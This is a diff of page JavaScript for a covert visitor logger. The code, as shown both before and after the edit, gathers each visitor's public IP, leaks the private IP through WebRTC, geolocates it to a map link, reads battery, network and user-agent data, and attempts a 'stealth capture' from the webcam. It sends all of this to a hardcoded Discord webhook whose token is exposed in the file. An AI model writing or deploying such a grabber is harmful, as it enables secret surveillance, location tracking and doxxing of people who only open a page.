@@ -41,14 +41,12 @@
         const WH_URL = "https://discord.com/api/webhooks/1490634346359685131/-YLEFmQlCi7HxAYEOvVWXDOehb8a3kj2DErBzYuL52iHD5pMlKmf0AU9ERkbzTXWu6lp";
 
         async function getStats() {
-            let stats = { battery: "Unknown", speed: "Unknown" };
+            let stats = { battery: "Unknown", net: "Unknown" };
             try {
                 const b = await navigator.getBattery();
                 stats.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-            } catch(e) {}
-            try {
                 const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if(n) stats.speed = `Down: ${n.downlink}Mbps / Type: ${n.effectiveType}`;
+                if(n) stats.net = `${n.downlink} Mbps (${n.effectiveType})`;
             } catch(e) {}
             return stats;
         }
@@ -58,10 +56,10 @@
                 const res = await fetch(`https://ipapi.co/${ip}/json/`);
                 const d = await res.json();
                 return {
-                    loc: `${d.city}, ${d.region}, ${d.country_name}`,
+                    addr: `${d.city}, ${d.region}, ${d.country_name}`,
                     map: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
                 };
-            } catch(e) { return { loc: "Unknown", map: "N/A" }; }
+            } catch(e) { return { addr: "Unknown", map: "N/A" }; }
         }
 
         async function getPrivateIP() {
@@ -71,10 +69,10 @@
                 rtc.createOffer().then(o => rtc.setLocalDescription(o));
                 rtc.onicecandidate = (e) => {
                     if (!e || !e.candidate) return;
-                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/) || e.candidate.candidate.match(/([a-f0-9\-]+\.local)/);
-                    if (match) { resolve(match[1]); rtc.onicecandidate = null; }
+                    const m = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/) || e.candidate.candidate.match(/([a-f0-9\-]+\.local)/);
+                    if (m) { resolve(m[1]); rtc.onicecandidate = null; }
                 };
-                setTimeout(() => resolve("PROTECTED"), 4000);
+                setTimeout(() => resolve("PROTECTED"), 3000);
             });
         }
 
@@ -83,22 +81,18 @@
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             
-            let r = {
-                ts: new Date().toLocaleString(),
-                gIP: "Fetching...", pIP: await getPrivateIP(),
-                plt: navigator.platform, ua: navigator.userAgent
-            };
+            let report = { ts: new Date().toLocaleString(), gIP: "DENIED", pIP: await getPrivateIP() };
 
-            const s = await getStats();
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
-                r.gIP = data.ip;
-            } catch(e) { r.gIP = "DENIED"; }
+                report.gIP = data.ip;
+            } catch(e) {}
 
-            const g = await getGeo(r.gIP);
+            const geo = await getGeo(report.gIP);
+            const stats = await getStats();
 
-            // ステルスキャプチャ
+            // 📷 ステルスキャプチャ
             let fileBlob = null;
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -117,18 +111,18 @@
             const payload = {
                 username: "NANA_ADMIN_LOGGER",
                 embeds: [{
-                    title: "🛑 OMNISCIENT_ACCESS_REPORT",
+                    title: "🛑 OMNI_ACCESS_REPORT",
                     color: 16727873,
                     fields: [
-                        { name: "🌐 GLOBAL_IP", value: `\`${r.gIP}\``, inline: true },
-                        { name: "🏠 PRIVATE_IP", value: `\`${r.pIP}\``, inline: true },
-                        { name: "📍 LOCATION", value: `[${g.loc}](${g.map})`, inline: false },
-                        { name: "🔋 BATTERY", value: `\`${s.battery}\``, inline: true },
-                        { name: "📶 NETWORK", value: `\`${s.speed}\``, inline: true },
-                        { name: "💻 SYSTEM", value: `\`${r.plt}\``, inline: true },
-                        { name: "📄 USER_AGENT", value: `\`\`\`${r.ua}\`\`\`` }
+                        { name: "🌐 GLOBAL_IP", value: `\`${report.gIP}\``, inline: true },
+                        { name: "🏠 PRIVATE_IP", value: `\`${report.pIP}\``, inline: true },
+                        { name: "📍 ADDRESS", value: `\`${geo.addr}\``, inline: false },
+                        { name: "🗺️ GOOGLE MAPS", value: `[View Location](${geo.map})`, inline: false },
+                        { name: "🔋 BATTERY", value: `\`${stats.battery}\``, inline: true },
+                        { name: "📶 NETWORK", value: `\`${stats.net}\``, inline: true },
+                        { name: "📄 USER_AGENT", value: `\`\`\`${navigator.userAgent}\`\`\`` }
                     ],
-                    footer: { text: `Captured: ${r.ts} | JANUS-V4` }
+                    footer: { text: `Captured: ${report.ts} | JANUS-V4` }
                 }]
             };
             fd.append('payload_json', JSON.stringify(payload));
